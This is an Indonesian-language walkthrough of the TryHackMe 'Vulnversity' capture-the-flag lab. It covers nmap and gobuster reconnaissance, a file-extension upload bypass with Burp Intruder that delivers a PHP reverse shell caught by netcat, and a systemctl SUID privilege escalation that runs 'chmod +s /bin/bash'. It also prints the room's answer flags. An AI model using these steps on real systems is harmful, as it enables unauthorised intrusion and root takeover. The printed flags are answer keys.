# CTF Vulnversity
- TryHackMe Room: https://tryhackme.com/room/vulnversity
- IP Machine: 10.10.137.132

## Task 2 - Reconnaissance
- Lakukan scanning dengan tool nmap menggunakan perintah: `nmap -sV -A <IP Machine>`

```sh
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -A 10.10.137.132
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 02:46 EDT
Nmap scan report for 10.10.137.132
Host is up (0.20s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/31%OT=21%CT=1%CU=44748%PV=Y%DS=2%DC=T%G=Y%TM=64C758F
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m43s, deviation: 2h18m34s, median: 4m42s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2023-07-31T02:51:50-04:00
| smb2-time: 
|   date: 2023-07-31T06:51:51
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   199.64 ms 10.8.0.1
2   199.84 ms 10.10.137.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.75 seconds
```

- **Pertanyaan:** Scan the box; how many ports are open?
```sh
6
```

- **Pertanyaan:** What version of the squid proxy is running on the machine?
```sh
3.5.12
```

- **Pertanyaan:** How many ports will Nmap scan if the flag -p-400 was used?
```sh
400
```

- **Pertanyaan:** What is the most likely operating system this machine is running?
```sh
Ubuntu
```

- **Pertanyaan:** What port is the web server running on?
```sh
3333
```

- **Pertanyaan:** What is the flag for enabling verbose mode using Nmap?
```sh
-v
```

## Task 3 Locating directories using Gobuster
- Buka halaman web `http://<IP_Machine>:3333` di browser

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%201.JPG)

- Lakukan web directory brute force dengan gobuster dengan perintah `gobuster dir -u http://<IP_Machine>:3333 -w <wordlists>`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%202.JPG)

- Dari hasil brute force gobuster diatas ditemukan halaman **/internal**. Kita bisa membuka di browser dengan url `http://<IP_Machine>:3333/internal` di browser. Setelah dibuka, halaman tersebut berisi form untuk upload file

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%203.JPG)

- **Pertanyaan:** What is the directory that has an upload form page?
```sh
/internal/
```

## Task 4 Compromise the Webserver
- Disini kita memanfaatkan celah keamanan **File Upload Vulnerabilities**. Salah satunya adalah dengan mengunggah file php reverse shell ke halaman upload file. Kita bisa mengunduh file php-reverse-shell di https://pentestmonkey.net/tools/web-shells/php-reverse-shell
- Setelah berhasil diunduh, edit file **php-reverse-shell.php** dengan menggunakan tool nano. Ubah ip dengan IP tun0 di komputer yang anda gunakan dan disini kita memakai port 4444 sebagai listening

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%204.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%205.JPG)

- Unggah file **php-reverse-shell.php** yang sudah diedit ke halaman `http://<IP_Machine>:3333/internal` dan tekan Submit. Setelah di submit ternyata muncul pesan bahwa extensi file tidak di izinkan

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%206.JPG)

- Kita bisa mencoba dengan format lain. Jalankan Burpsuite dan lakukan upload ulang untuk merekam request upload file

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%207.JPG)

- Klik kanan pada request upload file lalu pilih **Send to Intruder**. Pindah ke Tab Intruder lalu tekan tombol **Clear §** lalu block tulisan .php lalu tekan tombol **Add §**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%208.JPG)

- Pindah ke tab Payloads, bikin payload dengan type Simple list dan berisi daftar sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%209.JPG)

- Scroll ke bawah, pada bagian Payload Encoding hilangkan centang pada opsi URL-encode

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2010.JPG)

- Jalankan serangan dengan menekan tombol Start attack dan tunggu hingga proses selesai. Hasilnya payload **.phtml** memiliki panjang response yang paling berbeda dan memiliki pesan **Success** dibagian Response yang menandakan bahwa format **.phtml** adalah format file yang diizinkan

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2011.JPG)

- Kita bisa menduplikasi file **php-reverse-shell.php** dan menamainya dengan **php-reverse-shell.phtml** dengan perintah `cp php-reverse-shell.php php-reverse-shell.phtml`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2012.JPG)

- Upload file **php-reverse-shell.php** ke halaman `http://<IP_Machine>:3333/internal` dan pastikan muncul pesan **Success**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2013.JPG)
![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2014.JPG)

- Buka terminal dan jalankan netcat dengan perintah `nc -lnvp <port>`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2015.JPG)

- Jalankan payload dengan membuka url `http://<IP_Machine>:3333/internal/uploads/php-reverse-shell.phtml` di browser. Setelah payload dijalankan, netcat berhasil terkoneksi dengan server dan masuk sebagai **www-data**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2016.JPG)

- Di directory **/home** terdapat home directory bill. Navigasi ke directory **/home/bill** dan disana terdapat file **user.txt** sebagai user flag

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2017.JPG)

- **Pertanyaan:** What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
```sh
.php
```

- **Pertanyaan:** Run this attack, what extension is allowed?
```sh
.phtml
```

- **Pertanyaan:** What is the name of the user who manages the webserver?
```sh
bill
```

- **Pertanyaan:** What is the user flag?
```sh
8bd7992fbe8a6ad22a63361004cfcedb
```

## Task 5 Privilege Escalation
- Cari semua SUID yang dapat dieksekusi dengan perintah dibawah
```sh
find / -user root -perm -4000 -exec ls -ldb {} \;
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2018.JPG)

- Dari perintah diatas ditemukan file **/bin/systemctl** yang bisa digunakan untuk mengeskalasi user root

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2019.JPG)

- Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/systemctl/ untuk mendapatkan akses root melalui systemctl dan hanya perlu mengubah sedikit supaya bisa mengakses shell root. Anda bisa mengcopy tiap baris perintah dibawah ini dan menyalinnya ke shell server 

```sh
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2020.JPG)

- Jalankan bash dengan perintah `bash -p` setelah itu ketik `id` maka kita berhasil mendapatkan akses root

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2021.JPG)

- Sekarang kita tinggal membaca file **root.txt** sebagai root flag dengan perintah `cat /root/root.txt`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2022.JPG)


- **Pertanyaan:** On the system, search for all SUID files. Which file stands out?  
```sh
/bin/systemctl
```

- **Pertanyaan:** It's challenge time! We have guided you through this far. Can you exploit this system further to escalate your privileges and get the final answer? Become root and get the last flag (/root/root.txt)
```sh
a58ff8579f0a9270368d33a9966c7fd5
```